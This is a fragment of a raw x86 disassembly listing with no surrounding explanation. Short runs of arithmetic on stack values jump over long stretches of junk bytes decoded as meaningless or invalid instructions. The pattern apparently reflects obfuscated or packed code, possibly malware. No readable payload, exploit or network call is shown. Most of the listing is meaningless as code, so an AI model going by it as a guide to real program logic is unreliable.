  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	cli    
  411faa:	shr    DWORD PTR ds:0x1866a6be,0x18
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	stc    
  411fb6:	mov    ebp,0xf3cf65c
  411fbb:	into   
  411fbc:	js     0x411fe7
  411fbe:	pop    ebp
  411fbf:	pop    ecx
  411fc0:	mov    bh,ah
  411fc2:	pusha  
  411fc3:	adc    al,0x40
  411fc5:	cmp    DWORD PTR [eax+ecx*8-0x1],edx
  411fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fca:	mov    ds:0x58d05192,eax
  411fcf:	ds jmp 0x226a3bd4
  411fd5:	mov    ah,0x7e
  411fd7:	repz mul BYTE PTR ds:0x5d4ac7ad
  411fde:	frstor [ebx+0x26]
  411fe1:	test   bh,ah
  411fe3:	dec    ax
  411fe5:	pop    esi
  411fe6:	les    ecx,FWORD PTR [edi+0x598125c2]
  411fec:	cmp    eax,0xc78a62a4
  411ff1:	jae    0x411ff5
  411ff3:	mov    ds:0x7b4a8bd,eax
  411ff8:	outs   dx,BYTE PTR ds:[esi]
  411ff9:	scas   al,BYTE PTR es:[edi]
  411ffa:	sub    DWORD PTR [ecx-0x69],edi
  411ffd:	(bad)  
  411fff:	jmp    0x16451cc
  412004:	fld    DWORD PTR [ecx-0x7a]
  412007:	(bad)  
  412008:	xchg   esp,eax
  412009:	sar    DWORD PTR [edi-0x60123358],0x51
  412010:	mov    ds:0xb33fadde,eax
  412015:	adc    eax,0x77
  412018:	loop   0x411fa8
  41201a:	loop   0x412087
  41201c:	xchg   ecx,eax
  41201d:	xchg   BYTE PTR ds:0x52af6749,ah
  412023:	sbb    eax,DWORD PTR [edx+0x5f]
  412026:	pop    edx
  412027:	xor    ch,BYTE PTR [ecx+0x47527f32]
  41202d:	xor    cl,dh
  41202f:	xchg   ebp,eax
  412030:	jecxz  0x412089
  412032:	mov    ?,WORD PTR [ebx]
  412034:	mov    ebp,DWORD PTR [edx]
  412036:	lods   eax,DWORD PTR ds:[esi]
  412037:	ins    DWORD PTR es:[edi],dx
  412038:	sub    dl,bh
  41203a:	push   ss
  41203b:	sub    eax,0xce53d0ab
  412040:	xor    BYTE PTR [edx-0x64c10872],ah
  412046:	and    DWORD PTR [ecx+0x5b9265a8],ecx
  41204c:	lds    ebx,FWORD PTR [ecx-0x766bf472]
  412052:	push   0xffffffdc
  412054:	jecxz  0x412058
  412056:	out    0x21,eax
  412058:	aaa    
  412059:	dec    edx
  41205a:	cld    
  41205b:	or     ecx,0xffffffa8
  41205e:	fwait
  41205f:	jns    0x4120bd
  412061:	stos   BYTE PTR es:[edi],al
  412062:	mov    esi,0xf2e81c9a
  412067:	jns    0x4120c3
  412069:	es ret 
  41206b:	fld    TBYTE PTR [ecx-0x2cab5849]
  412071:	in     eax,0x51
  412073:	sub    BYTE PTR [ebp+0x3],0x1f
  412077:	mov    ecx,edi
  412079:	bound  ebp,QWORD PTR [ebx+0x72]
  41207c:	push   ds
  41207d:	inc    esi
  41207e:	and    esp,eax
  412080:	adc    edi,eax
  412082:	xor    DWORD PTR [edi],0xf495f46c
  412088:	call   0x881e867e
  41208d:	adc    esp,DWORD PTR [eax+0x37696be9]
  412093:	jmp    0xed87:0xbe19e43
  41209a:	mov    ebp,0xbeac9a63
  41209f:	hlt    
  4120a0:	pop    eax
  4120a1:	sbb    al,0x42
  4120a3:	dec    esp
  4120a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a5:	bound  edi,QWORD PTR [ecx+0x38]
  4120a8:	or     ebx,DWORD PTR [edi]
  4120aa:	scas   eax,DWORD PTR es:[edi]
  4120ab:	xor    eax,0xdf18e08b
  4120b0:	aad    0x78
  4120b2:	mov    ss,WORD PTR [edx+0x1a]
  4120b5:	dec    esi
  4120b6:	jecxz  0x412076
  4120b8:	sbb    eax,0x2de1e946
  4120bd:	les    ebx,FWORD PTR [ebx-0x9d644a6]
  4120c3:	(bad)  
  4120c4:	mov    ch,0x2
  4120c6:	push   esp
  4120c7:	pop    ss
  4120c8:	sbb    DWORD PTR [ebp-0x5eb232d1],edi
  4120ce:	sahf   
  4120cf:	outs   dx,BYTE PTR ds:[esi]
  4120d0:	jl     0x412140
  4120d2:	sbb    DWORD PTR [ebp+0x41],edx
  4120d5:	push   ds
  4120d6:	loope  0x412064
  4120d8:	stos   BYTE PTR es:[edi],al
  4120d9:	push   edx
  4120da:	repnz pop ds
  4120dc:	xlat   BYTE PTR ds:[ebx]
  4120dd:	mov    edi,0x70a12fc3
  4120e2:	ja     0x4120fd
  4120e4:	(bad)  
  4120e5:	push   edi
  4120e6:	mov    BYTE PTR [edi-0x13804ba],bl
  4120ec:	jl     0x4120d5
  4120ee:	add    DWORD PTR [ebp-0x54],esi
  4120f1:	(bad)  
  4120f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120f3:	je     0x4120de
  4120f5:	mov    dl,0xe8
  4120f7:	dec    esp
  4120f8:	inc    edx
  4120f9:	sti    
  4120fa:	dec    edi
  4120fb:	pop    ss
  4120fc:	add    bl,BYTE PTR [ebx+0x46]
  4120ff:	mov    eax,ds:0x5d3b3ce0
  412104:	push   ds
  412105:	add    al,0xe7
  412107:	cmp    DWORD PTR ss:[eax+0x13],ebp
  41210b:	dec    edi
  41210c:	ins    DWORD PTR es:[edi],dx
  41210d:	outs   dx,DWORD PTR ds:[esi]
  41210e:	or     cl,BYTE PTR [ebx+ecx*4+0x5a]
  412112:	inc    ecx
  412113:	imul   edx,esp,0xa
  412116:	or     eax,0xba740131
  41211b:	lahf   
  41211c:	ret    0x13ac
  41211f:	icebp  
  412120:	inc    esp
  412121:	jge    0x412159
  412123:	push   eax
  412124:	call   0x8495e4f0
  412129:	cdq    
  41212a:	aam    0x62
  41212c:	add    ch,BYTE PTR [eax]
  41212e:	das    
  41212f:	jg     0x412161
  412131:	fst    DWORD PTR [edi]
  412133:	test   DWORD PTR [eax-0x4f],edi
  412136:	cwde   
  412137:	stos   BYTE PTR es:[edi],al
  412138:	in     al,0x7c
  41213a:	call   0xf1a55be
  41213f:	push   esp
  412140:	jns    0x4120e1
  412142:	add    eax,DWORD PTR [ebx+0x6f]
  412145:	pop    ds
  412146:	outs   dx,DWORD PTR ds:[esi]
  412147:	lock fwait
  412149:	adc    eax,0x1b4443db
  41214e:	ja     0x412107
  412150:	inc    ebp
  412151:	pop    ebp
  412152:	test   DWORD PTR [eax],ebp
  412154:	mov    ds:0x96824fed,al
  412159:	xor    esp,DWORD PTR [ebx]
  41215b:	sti    
  41215c:	cwde   
  41215d:	jno    0x41213e
  41215f:	sub    BYTE PTR [edi-0x67],ah
  412162:	sbb    al,0xeb
  412164:	cdq    
  412165:	xchg   esi,eax
  412166:	xor    DWORD PTR [ebx],esi
  412168:	jo     0x412113
  41216a:	or     ecx,DWORD PTR [ebx+0x1d790c85]
  412170:	cdq    
  412171:	shr    ah,0x66
  412174:	cmp    eax,0x3cd83a7d
  412179:	pop    es
  41217a:	push   ss
  41217b:	out    0xf,eax
  41217d:	push   ss
  41217e:	xchg   esp,eax
  41217f:	fwait
  412180:	and    ebp,DWORD PTR [edi+0x47]
  412183:	pop    edx
  412184:	push   esp
  412185:	(bad)  
  412186:	mov    ch,0xd6
  412188:	inc    edx
  412189:	and    bl,BYTE PTR [ebx+0x9]
  41218c:	in     al,0x2a
  41218e:	sub    esi,esp
  412190:	xchg   ah,bh
  412192:	shl    DWORD PTR ss:[edx],cl
  412195:	(bad)  
  412196:	mov    ebp,0xfd5ae0dc
  41219b:	push   es
  41219c:	mov    dl,0xfe
  41219e:	cdq    
  41219f:	jo     0x412206
  4121a1:	push   edi
  4121a2:	mov    ah,0xb6
  4121a4:	lea    edi,[edx]
  4121a6:	retf   
  4121a7:	mov    edi,0x206b9267
  4121ac:	and    edx,eax
  4121ae:	mov    esp,0xab241fd5
  4121b3:	loope  0x412228
  4121b5:	sub    eax,0x998c6e08
  4121ba:	call   0x62b6d2cd
  4121bf:	jns    0x41220b
  4121c1:	xor    BYTE PTR [esi-0x7a],ch
  4121c4:	add    esp,DWORD PTR [ebx+ebx*4-0x78a1a27f]
  4121cb:	add    eax,0x963480e1
  4121d0:	scas   al,BYTE PTR es:[edi]
  4121d1:	call   0x23d45d74
  4121d6:	lods   eax,DWORD PTR ds:[esi]
  4121d7:	fisttp WORD PTR [ecx+esi*2+0x3c0a9a00]
  4121de:	ffree  st(5)
  4121e0:	enter  0x3251,0x3d
  4121e4:	mov    edi,0x7af88341
  4121e9:	add    eax,0xbe7ee41e
  4121ee:	or     BYTE PTR ds:0x272129a8,bl
  4121f4:	xor    DWORD PTR [esp+ebx*4-0x2166dce1],0x57ec9ed0
  4121ff:	add    eax,0xa2907f8
  412204:	sbb    ebx,DWORD PTR [esi*8+0x2ceb6ddd]
  41220b:	mov    ch,0xb9
  41220d:	push   0xe4c37b20
  412212:	xor    eax,0x3884
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x42263c
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	mov    dl,BYTE PTR [edx+0x55]
  4122a4:	stos   BYTE PTR es:[edi],al
  4122a5:	(bad)  
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	mov    eax,0x7827fff6
  4122b2:	sub    BYTE PTR [edx-0xa],0xab
  4122b6:	jns    0x412330
  4122b8:	mov    al,0xba
  4122ba:	out    0x24,al
  4122bc:	pop    edi
  4122bd:	or     eax,0x6c4c59f6
  4122c2:	dec    edi
  4122c3:	mov    ebp,DWORD PTR [ecx-0x5ac3384a]
  4122c9:	pop    ss
  4122ca:	dec    esp
  4122cb:	pop    edi
  4122cc:	mov    ebp,0x57adfade
  4122d1:	or     DWORD PTR ds:0xc016e2e9,edx
  4122d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122d8:	jp     0x412299
  4122da:	inc    edx
  4122db:	leave  
  4122dc:	cwde   
  4122dd:	pusha  
  4122de:	out    0xa3,eax
  4122e0:	push   0xe0664401
  4122e5:	xchg   DWORD PTR [edx-0x79],ebx
  4122e8:	mov    al,ds:0xed6bdbe9
  4122ed:	in     eax,0x32
  4122ef:	mov    ah,0x54
  4122f1:	call   0x9834:0xe7e5c5bc
  4122f8:	inc    edx
  4122f9:	aad    0xe7
  4122fb:	(bad)  
  4122fc:	loope  0x412362
  4122fe:	nop
  4122ff:	mov    bh,0xfa
  412301:	pop    edi
  412302:	inc    edx
  412303:	lea    ebp,[eax-0x4c]
  412306:	cld    
  412307:	mov    dh,0x15
  412309:	fwait
  41230a:	scas   eax,DWORD PTR es:[edi]
  41230b:	add    al,0xbd
  41230d:	repz dec esi
  41230f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412310:	xor    BYTE PTR [edi-0x633ae216],dl
  412316:	dec    ecx
  412317:	rcr    BYTE PTR [edi],0x73
  41231a:	ins    BYTE PTR es:[edi],dx
  41231b:	push   ss
  41231c:	dec    esi
  41231d:	shr    DWORD PTR [ecx+ecx*1+0x45],0xbd
  412322:	add    BYTE PTR [esi+0x2b72445],dh
  412328:	pop    ecx
  412329:	jg     0x412326
  41232b:	add    cl,0x12
  41232e:	sbb    bh,dl
  412330:	ds adc eax,0x39598b31
  412336:	mov    ebp,0xd9adc4e
  41233b:	es jmp 0x412348
  41233e:	dec    eax
  41233f:	fistp  QWORD PTR [edi]
  412341:	xchg   esp,eax
  412342:	les    ebp,FWORD PTR [ebx+0x6b]
  412345:	inc    ecx
  412346:	sub    ah,BYTE PTR [eax+0x64]
  412349:	jmp    0x412316
  41234b:	aas    
  41234c:	stos   DWORD PTR es:[edi],eax
  41234d:	into   
  41234e:	pop    ebp
  41234f:	jmp    0x41231d
  412351:	bound  ebp,QWORD PTR [edx+0x71]
  412354:	fwait
  412355:	sbb    BYTE PTR [ecx-0xc],0xbd
  412359:	loope  0x4122fa
  41235b:	ins    BYTE PTR es:[edi],dx
  41235c:	les    ebp,FWORD PTR [ecx-0x575babf2]
  412362:	inc    eax
  412363:	fwait
  412364:	push   esp
  412365:	fst    QWORD PTR [edx+0x2df70868]
  41236b:	mov    BYTE PTR [edi-0x4d],cl
  41236e:	test   al,0xc0
  412370:	ja     0x41230c
  412372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412373:	in     eax,0x4b
  412375:	xor    DWORD PTR [ecx+0x6e848795],esp
  41237b:	jl     0x4123a7
  41237d:	fs int 0xd1
  412380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412381:	ins    DWORD PTR es:[edi],dx
  412382:	adc    bh,BYTE PTR [ecx-0x33]
  412385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412386:	mov    BYTE PTR [eax],dl
  412388:	xchg   ecx,eax
  412389:	lods   eax,DWORD PTR ds:[esi]
  41238a:	or     al,0x69
  41238c:	call   0xeff94139
  412391:	pop    ss
  412392:	mov    ebx,0xd4f32af1
  412397:	(bad)  [ebx]
  412399:	les    edx,FWORD PTR [edx-0x70]
  41239c:	sbb    ecx,eax
  41239e:	pushf  
  41239f:	adc    BYTE PTR [esi+0x97b5a7],0x67
  4123a6:	pop    esi
  4123a7:	pushf  
  4123a8:	cmp    al,0xa3
  4123aa:	jg     0x412417
  4123ac:	and    dl,BYTE PTR [edx+edx*1]
  4123af:	bound  esi,QWORD PTR [edi]
  4123b1:	cmovs  ebx,DWORD PTR [ecx+0xd]
  4123b5:	mov    cl,0xf2
  4123b7:	mov    esi,0x9355b87a
  4123bc:	mov    dl,0xec
  4123be:	pop    ebp
  4123bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123c0:	or     eax,0x1217bbdc
  4123c5:	dec    ecx
  4123c6:	mov    al,0x6b
  4123c8:	add    edi,DWORD PTR [edi-0x61]
  4123cb:	gs loope 0x412351
  4123ce:	jns    0x4123c9
  4123d0:	inc    esp
  4123d1:	in     eax,dx
  4123d2:	fwait
  4123d3:	lock adc eax,0x7b4749d1
  4123d9:	adc    eax,DWORD PTR [esi]
  4123db:	pop    esi
  4123dc:	adc    DWORD PTR [esi-0x3e],0xffffff88
  4123e0:	sbb    edx,DWORD PTR [ebp+0x51e63768]
  4123e6:	inc    ebp
  4123e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123e8:	jg     0x412427
  4123ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123eb:	in     eax,dx
  4123ec:	dec    DWORD PTR [eax+0x12]
  4123ef:	mov    DWORD PTR [ebx-0x6],ebx
  4123f2:	inc    ebp
  4123f3:	call   0xe745:0x460eb457
  4123fa:	loopne 0x412383
  4123fc:	dec    eax
  4123fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123fe:	lahf   
  4123ff:	call   0xcd068411
  412404:	int    0x56
  412406:	(bad)  
  412407:	sti    
  412408:	xchg   edi,eax
  412409:	dec    eax
  41240a:	jp     0x412438
  41240c:	pushf  
  41240d:	pop    ecx
  41240e:	pop    eax
  41240f:	test   BYTE PTR [ecx],dh
  412411:	ficom  WORD PTR [ecx+0x1f]
  412414:	(bad)  
  412415:	xchg   ebp,eax
  412416:	xor    eax,0x8536c8b0
  41241b:	push   eax
  41241c:	pop    esi
  41241d:	or     BYTE PTR [ecx+0x2c],bl
  412420:	sbb    cl,BYTE PTR [edx]
  412422:	inc    edi
  412423:	das    
  412424:	sbb    cl,BYTE PTR [ebx+ecx*1+0x4a9947dd]
  41242b:	mov    dh,0xc2
  41242d:	add    eax,0x7e90de53
  412432:	mov    esp,0xa60b0360
  412437:	xchg   BYTE PTR ds:0xff432248,ah
  41243d:	xor    ebp,DWORD PTR [ebx-0x5e]
  412440:	and    edx,DWORD PTR [ebx+0x7e8c1ed2]
  412446:	push   edx
  412447:	sbb    DWORD PTR [eax+0x7bae4b0e],edx
  41244d:	dec    ecx
  41244e:	adc    DWORD PTR [ebx+0x2f],edx
  412451:	in     eax,0x28
  412453:	ss cmp al,0xa4
  412456:	or     BYTE PTR [ecx-0x26],dh
  412459:	jns    0x41242b
  41245b:	scas   al,BYTE PTR es:[edi]
  41245c:	jecxz  0x4124ab
  41245e:	jns    0x4124da
  412460:	mov    al,ds:0xae91ea8e
  412465:	cmp    dl,0xe1
  412468:	out    dx,al
  412469:	xor    dh,BYTE PTR [edi+0x5e]
  41246c:	mov    DWORD PTR [edx+0x4cf22968],ebp
  412472:	dec    edx
  412473:	push   ecx
  412474:	pop    esp
  412475:	dec    edi
  412476:	dec    ebp
  412477:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412479:	sbb    edx,DWORD PTR [edx]
  41247b:	daa    
  41247c:	sub    dl,ch
  41247e:	in     eax,0x98
  412480:	mov    eax,ds:0xdcf598bc
  412485:	rdtsc  
  412487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412488:	or     DWORD PTR [eax],ebx
  41248a:	mov    al,0x9b
  41248c:	pop    esp
  41248d:	push   edx
  41248e:	or     al,0xd4
  412490:	and    ecx,DWORD PTR [ecx+0x6]
  412493:	jecxz  0x4124fe
  412495:	xchg   ebp,eax
  412496:	test   eax,0x5accb597
  41249b:	push   0xffffffe1
  41249d:	xchg   edi,eax
  41249e:	call   0x26e46642
  4124a3:	mov    eax,ds:0x4f07d4be
  4124a8:	ret    
  4124a9:	add    ch,BYTE PTR [eax]
  4124ab:	inc    edx
  4124ac:	adc    bl,BYTE PTR [esp-0x1a2be1d4]
  4124b3:	pop    ds
  4124b4:	vfmsubaddps xmm1,xmm6,xmm7,XMMWORD PTR [esi+0x6a]
  4124bb:	sub    bl,ch
  4124bd:	stos   DWORD PTR es:[edi],eax
  4124be:	and    ch,BYTE PTR [esi-0x62]
  4124c1:	jmp    0x4124d1
  4124c3:	pop    ebp
  4124c4:	rol    DWORD PTR ds:0x46f3ce12,1
  4124ca:	cmp    cl,BYTE PTR [eax-0x6b]
  4124cd:	ret    0x3ee8
  4124d0:	cmp    ebx,DWORD PTR [esi-0x4f2e33e4]
  4124d6:	(bad)  
  4124d7:	jmp    0xe8fc:0x7e80cbb7
  4124de:	in     al,0xc5
  4124e0:	pop    edx
  4124e1:	pop    esi
  4124e2:	jnp    0x412483
  4124e4:	stos   DWORD PTR es:[edi],eax
  4124e5:	push   cs
  4124e6:	jae    0x412488
  4124e8:	jle    0x41253f
  4124ea:	faddp  st(2),st
  4124ec:	aad    0x70
  4124ee:	fmul   st,st(7)
  4124f0:	icebp  
  4124f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124f2:	or     al,0xde
  4124f4:	imul   esi,DWORD PTR [edi-0x2c],0x4f2fba3c
  4124fb:	mov    ch,0x87
  4124fd:	jle    0x4124bd
  4124ff:	xchg   esp,eax
  412500:	int    0x4d
  412502:	xor    ah,dh
  412504:	outs   dx,BYTE PTR ds:[esi]
  412505:	add    edx,eax
  412507:	adc    esi,ecx
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x4220b4
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x4125a4
  412538:	push   0x5c576af4
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	cs push ds
  412545:	jg     0x41256f
  412547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412548:	cwde   
  412549:	out    dx,al
  41254a:	add    dh,ah
  41254c:	ds mov dh,0x67
  41254f:	and    eax,0x60f847b
  412554:	or     DWORD PTR [edx],esi
  412556:	and    BYTE PTR [eax],0xe7
  412559:	dec    eax
  41255a:	pop    ds
  41255b:	ret    0xef71
  41255e:	cmp    ecx,DWORD PTR [esi]
  412560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412561:	push   edi
  412562:	das    
  412563:	bound  eax,QWORD PTR [ebp+0x30]
  412566:	mov    dl,0xba
  412568:	push   ds
  412569:	mov    edi,0xc82215a9
  41256e:	adc    al,0xe
  412570:	mov    edi,ebx
  412572:	aas    
  412573:	stos   BYTE PTR es:[edi],al
  412574:	dec    ebp
  412575:	xchg   DWORD PTR ds:0x108bdf87,ecx
  41257b:	dec    ecx
  41257c:	xor    eax,0x261871b7
  412581:	dec    ecx
  412582:	sbb    eax,DWORD PTR [esi+0x5071c67]
  412588:	inc    edx
  412589:	imul   esi,DWORD PTR [edi+0x1bf899fb],0xffffffc3
  412590:	cdq    
  412591:	and    DWORD PTR ds:0x1d0c1379,esi
  412597:	adc    ch,BYTE PTR [ecx+0x24d25a5]
  41259d:	popf   
  41259e:	sbb    bh,bh
  4125a0:	into   
  4125a1:	das    
  4125a2:	xor    ch,al
  4125a4:	mov    ebp,0x949b47ca
  4125a9:	xor    eax,0xac64f0c6
  4125ae:	sub    BYTE PTR ds:0x68a3c43a,cl
  4125b4:	ret    
  4125b5:	fsub   QWORD PTR ds:0xe13de1fe
  4125bb:	mov    esi,0x3c16d4c3
  4125c0:	pusha  
  4125c1:	and    DWORD PTR [ebx],esp
  4125c3:	pop    ss
  4125c4:	add    BYTE PTR [edi],0x12
  4125c7:	sbb    al,0xef
  4125c9:	ret    
  4125ca:	fldenv [ebp+0x333ddbf0]
  4125d0:	dec    esi
  4125d1:	iret   
  4125d2:	push   ds
  4125d3:	add    eax,0x9e0a0dcb
  4125d8:	or     esi,0x57
  4125db:	xchg   BYTE PTR [ebx+0x525066f2],ah
  4125e1:	jecxz  0x412649
  4125e3:	xchg   edx,eax
  4125e4:	sbb    BYTE PTR [eax+0x29],dh
  4125e7:	cmp    eax,0x85afa9be
  4125ec:	pop    esi
  4125ed:	aam    0x99
  4125ef:	pop    edi
  4125f0:	cwde   
  4125f1:	add    DWORD PTR [eax-0x76fc68c5],ecx
  4125f7:	fsubr  st(3),st
  4125f9:	sub    BYTE PTR [edi],ch
  4125fb:	scas   al,BYTE PTR es:[edi]
  4125fc:	xchg   edi,eax
  4125fd:	inc    esi
  4125fe:	fsubp  st(6),st
  412600:	sub    ebp,eax
  412602:	push   edi
  412603:	sahf   
  412604:	rol    BYTE PTR [edx+0x57ae0fec],cl
  41260a:	mov    esi,0x83c26627
  41260f:	push   eax
  412610:	and    DWORD PTR [eax-0x302ed086],esi
  412616:	bound  ecx,QWORD PTR [ecx]
  412618:	lods   eax,DWORD PTR ds:[esi]
  412619:	mov    DWORD PTR [ebx+edx*1-0x382d03ba],edx
  412620:	add    al,0xa6
  412622:	xor    bh,bl
  412624:	aam    0xf
  412626:	sub    DWORD PTR [eax+0x50],ebx
  412629:	mov    cl,0xa1
  41262b:	outs   dx,DWORD PTR ds:[esi]
  41262c:	sub    al,bl
  41262e:	(bad)  
  41262f:	or     DWORD PTR [esi+0x22],ebx
  412632:	xor    ch,bl
  412634:	mov    dl,0x3
  412636:	stos   DWORD PTR es:[edi],eax
  412637:	mov    ch,0xd9
  412639:	loopne 0x4125e6
  41263b:	mov    dh,0x69
  41263d:	jp     0x412646
  41263f:	mov    bh,0x9
  412641:	inc    edx
  412642:	jb     0x41264f
  412644:	in     eax,dx
  412645:	add    cl,BYTE PTR [eax-0x50e6c429]
  41264b:	ds pop eax
  41264d:	test   BYTE PTR [ebx+0x3e],0xaf
  412651:	add    DWORD PTR [edi-0x7e5637c1],ecx
  412657:	and    DWORD PTR [ebx+0x43],ebp
  41265a:	adc    ecx,DWORD PTR [ebp-0x4]
  41265d:	fistp  WORD PTR [edi-0x69ad1690]
  412663:	ret    0x2ac5
  412666:	fsub   QWORD PTR [esi]
  412668:	pop    edx
  412669:	xor    bh,ah
  41266b:	and    eax,0xd304e55
  412670:	fsub   DWORD PTR [edi+0x76]
  412673:	inc    ecx
  412674:	and    DWORD PTR [edx],ebx
  412676:	cs xchg edi,eax
  412678:	call   0xd1e4514b
  41267d:	jae    0x41263a
  41267f:	mov    ds:0xffd463d9,eax
  412684:	push   ss
  412685:	cwde   
  412686:	add    DWORD PTR [esi],0x21
  412689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41268a:	mov    edx,0x969787fd
  41268f:	call   0x372360fe
  412694:	and    cl,BYTE PTR [ebx+0x23]
  412697:	mov    WORD PTR [ebp+edi*2-0x10],fs
  41269b:	sar    BYTE PTR [esi+0x41],cl
  41269e:	test   edx,esi
  4126a0:	out    dx,eax
  4126a1:	dec    edx
  4126a2:	(bad)  
  4126a3:	mov    ebx,0x9eeb28af
  4126a8:	lods   eax,DWORD PTR ds:[esi]
  4126a9:	inc    ecx
  4126aa:	in     al,0x66
  4126ac:	pop    ebp
  4126ad:	call   0x9033:0x58369eaf
  4126b4:	in     eax,0xd
  4126b6:	outs   dx,DWORD PTR ds:[esi]
  4126b7:	shr    dl,0x1e
  4126ba:	sbb    DWORD PTR [esi+0x65],esi
  4126bd:	int3   
  4126be:	adc    eax,0xcfc60316
  4126c3:	jae    0x4126d7
  4126c5:	inc    ebp
  4126c6:	call   0x4d28:0x3d12de95
  4126cd:	xchg   esp,eax
  4126ce:	bound  ebx,QWORD PTR [esi+0x5]
  4126d1:	imul   ebp,DWORD PTR [ebp-0x3fdaebed],0xb49f0716
  4126db:	jge    0x4126a1
  4126dd:	adc    ecx,DWORD PTR [eax-0x1d73dae8]
  4126e3:	push   0x67
  4126e5:	cmp    DWORD PTR [ecx+0x5abecd8b],0xdd8cfca6
  4126ef:	loopne 0x412756
  4126f1:	es inc ebp
  4126f3:	or     dh,al
  4126f5:	and    DWORD PTR [edi+ebx*1],esp
  4126f8:	jl     0x41271a
  4126fa:	mov    eax,cs:0x775fedfd
  412700:	mov    WORD PTR [ebx],?
  412702:	xchg   ecx,eax
  412703:	ror    DWORD PTR [eax-0x48],cl
  412706:	push   eax
  412707:	jo     0x4126df
  412709:	jbe    0x4126bd
  41270b:	std    
  41270c:	sbb    DWORD PTR [edi-0x14],ebp
  41270f:	push   ss
  412710:	inc    ebx
  412711:	inc    ebp
  412712:	jmp    0x4126bb
  412714:	fwait
  412715:	pushf  
  412716:	stos   BYTE PTR es:[edi],al
  412717:	adc    BYTE PTR [edi],bl
  412719:	inc    eax
  41271a:	sbb    dh,bh
  41271c:	cmp    esi,edi
  41271e:	sub    DWORD PTR [bp+di+0xaac],ebp
  412723:	ss dec ebp
  412725:	jo     0x412799
  412727:	(bad)  
  412728:	mov    ebp,0x384d08b2
  41272d:	xchg   edi,eax
  41272e:	push   esp
  41272f:	push   cs
  412730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412731:	(bad)  
  412732:	cmp    DWORD PTR [edx+0x7f],edi
  412735:	jmp    0x41271d
  412737:	call   0x29504fce
  41273c:	add    DWORD PTR [ecx],ecx
  41273e:	fs pop es
  412740:	jbe    0x4126f1
  412742:	lock mov al,0x18
  412745:	ins    DWORD PTR es:[edi],dx
  412746:	call   0xa105:0x120b49c
  41274d:	fisub  DWORD PTR [edx]
  41274f:	test   eax,0xee14ee9d
  412754:	jp     0x4126f5
  412756:	jg     0x41271a
  412758:	(bad)  
  412759:	jmp    0x5c78:0x4592e6f0
